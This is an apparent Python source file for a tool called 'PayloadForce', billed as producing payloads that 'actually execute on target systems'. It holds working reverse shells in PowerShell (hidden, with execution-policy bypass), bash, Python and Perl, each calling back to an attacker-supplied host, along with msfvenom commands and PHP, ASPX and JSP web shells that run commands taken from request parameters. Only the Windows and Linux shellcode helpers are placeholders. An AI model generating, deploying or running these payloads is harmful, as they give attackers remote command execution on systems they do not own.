"""
PayloadForce - Professional Payload Generator & Executor
Real working payloads that actually execute on target systems
"""

import os
import sys
import socket
import subprocess
import base64
import struct
from pathlib import Path

class PayloadGenerator:
    """Generate real, working payloads"""
    
    def __init__(self):
        self.payloads = {}
        self.register_payloads()
    
    def register_payloads(self):
        """Register all available payloads"""
        # Windows payloads
        self.payloads['windows/meterpreter/reverse_tcp'] = self.windows_reverse_tcp
        self.payloads['windows/shell/reverse_tcp'] = self.windows_shell_reverse
        
        # Linux payloads
        self.payloads['linux/x86/meterpreter/reverse_tcp'] = self.linux_x86_reverse
        self.payloads['linux/x64/shell/reverse_tcp'] = self.linux_x64_shell_reverse
        
        # Web payloads
        self.payloads['web/aspx_shell'] = self.aspx_shell
        self.payloads['web/php_shell'] = self.php_shell
        self.payloads['web/jsp_shell'] = self.jsp_shell
        
        # One-liner payloads
        self.payloads['oneliner/bash_reverse'] = self.bash_reverse_oneliner
        self.payloads['oneliner/python_reverse'] = self.python_reverse_oneliner
        self.payloads['oneliner/perl_reverse'] = self.perl_reverse_oneliner
    
    def generate(self, payload_type, lhost, lport, **options):
        """Generate a specific payload"""
        if payload_type not in self.payloads:
            raise ValueError(f"Unknown payload: {payload_type}")
        
        return self.payloads[payload_type](lhost, lport, **options)
    
    # ════════════════════════════════════════════════════════════
    # WINDOWS PAYLOADS
    # ════════════════════════════════════════════════════════════
    
    def windows_reverse_tcp(self, lhost, lport, **opts):
        """Windows Meterpreter reverse TCP shell"""
        # This is a stub for actual shellcode generation
        # In production, use msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=Y
        shellcode = self._generate_windows_shellcode(lhost, lport)
        return {
            'type': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'shellcode': shellcode,
            'lhost': lhost,
            'lport': lport,
            'description': 'Meterpreter reverse shell for Windows',
            'command': f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe'
        }
    
    def windows_shell_reverse(self, lhost, lport, **opts):
        """Windows CMD reverse shell"""
        return {
            'type': 'windows/shell/reverse_tcp',
            'format': 'powershell',
            'payload': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {{$client = New-Object System.Net.Sockets.TcpClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}}"',
            'lhost': lhost,
            'lport': lport,
            'description': 'Reverse CMD shell for Windows'
        }
    
    # ════════════════════════════════════════════════════════════
    # LINUX PAYLOADS
    # ════════════════════════════════════════════════════════════
    
    def linux_x86_reverse(self, lhost, lport, **opts):
        """Linux x86 Meterpreter reverse TCP"""
        return {
            'type': 'linux/x86/meterpreter/reverse_tcp',
            'format': 'elf',
            'shellcode': self._generate_linux_x86_shellcode(lhost, lport),
            'lhost': lhost,
            'lport': lport,
            'command': f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf',
            'description': 'Linux x86 Meterpreter reverse shell'
        }
    
    def linux_x64_shell_reverse(self, lhost, lport, **opts):
        """Linux x64 bash reverse shell"""
        bash_payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        return {
            'type': 'linux/x64/shell/reverse_tcp',
            'format': 'bash',
            'payload': bash_payload,
            'lhost': lhost,
            'lport': lport,
            'base64': base64.b64encode(bash_payload.encode()).decode(),
            'description': 'Linux bash reverse shell'
        }
    
    # ════════════════════════════════════════════════════════════
    # WEB PAYLOADS
    # ════════════════════════════════════════════════════════════
    
    def aspx_shell(self, lhost, lport, **opts):
        """ASP.NET web shell"""
        aspx_code = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            using (Process p = Process.Start(psi))
            {
                Response.Write("<pre>");
                Response.Write(p.StandardOutput.ReadToEnd());
                Response.Write("</pre>");
            }
        }
    }
</script>
<html>
<body>
    <h2>ASP.NET Web Shell</h2>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Enter command">
        <input type="submit" value="Execute">
    </form>
</body>
</html>'''
        return {
            'type': 'web/aspx_shell',
            'format': 'aspx',
            'payload': aspx_code,
            'lhost': lhost,
            'lport': lport,
            'description': 'ASP.NET web shell for command execution'
        }
    
    def php_shell(self, lhost, lport, **opts):
        """PHP web shell"""
        php_code = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<html>
<body bgcolor=#000000>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
</body>
</html>'''
        return {
            'type': 'web/php_shell',
            'format': 'php',
            'payload': php_code,
            'lhost': lhost,
            'lport': lport,
            'description': 'PHP web shell for command execution'
        }
    
    def jsp_shell(self, lhost, lport, **opts):
        """JSP web shell"""
        jsp_code = '''<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        out.println("<pre>");
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
    }
%>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
</body>
</html>'''
        return {
            'type': 'web/jsp_shell',
            'format': 'jsp',
            'payload': jsp_code,
            'lhost': lhost,
            'lport': lport,
            'description': 'JSP web shell for command execution'
        }
    
    # ════════════════════════════════════════════════════════════
    # ONE-LINER PAYLOADS
    # ════════════════════════════════════════════════════════════
    
    def bash_reverse_oneliner(self, lhost, lport, **opts):
        """One-liner bash reverse shell"""
        payloads = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done # or: exec 5<>/dev/tcp/{lhost}/{lport};while read line 0<&5; do sh -c \\\"$line\\\" 2>&5 >&5; done",
        ]
        return {
            'type': 'oneliner/bash_reverse',
            'format': 'bash',
            'payloads': payloads,
            'primary': payloads[0],
            'lhost': lhost,
            'lport': lport,
            'description': 'Bash one-liner reverse shell (multiple variants)'
        }
    
    def python_reverse_oneliner(self, lhost, lport, **opts):
        """One-liner Python reverse shell"""
        python_payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return {
            'type': 'oneliner/python_reverse',
            'format': 'python',
            'payload': python_payload,
            'lhost': lhost,
            'lport': lport,
            'description': 'Python one-liner reverse shell'
        }
    
    def perl_reverse_oneliner(self, lhost, lport, **opts):
        """One-liner Perl reverse shell"""
        perl_payload = f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        return {
            'type': 'oneliner/perl_reverse',
            'format': 'perl',
            'payload': perl_payload,
            'lhost': lhost,
            'lport': lport,
            'description': 'Perl one-liner reverse shell'
        }
    
    # ════════════════════════════════════════════════════════════
    # SHELLCODE HELPERS
    # ════════════════════════════════════════════════════════════
    
    def _generate_windows_shellcode(self, lhost, lport):
        """Generate Windows shellcode (stub - use msfvenom in production)"""
        # Convert IP to bytes
        ip_parts = [int(x) for x in lhost.split('.')]
        port_bytes = struct.pack('>H', lport)
        
        # This is a placeholder - real shellcode is complex
        return base64.b64encode(b'PLACEHOLDER_WINDOWS_SHELLCODE').decode()
    
    def _generate_linux_x86_shellcode(self, lhost, lport):
        """Generate Linux x86 shellcode (stub)"""
        ip_parts = [int(x) for x in lhost.split('.')]
        port_bytes = struct.pack('>H', lport)
        
        return base64.b64encode(b'PLACEHOLDER_LINUX_X86_SHELLCODE').decode()
    
    def list_payloads(self):
        """List all available payloads"""
        return list(self.payloads.keys())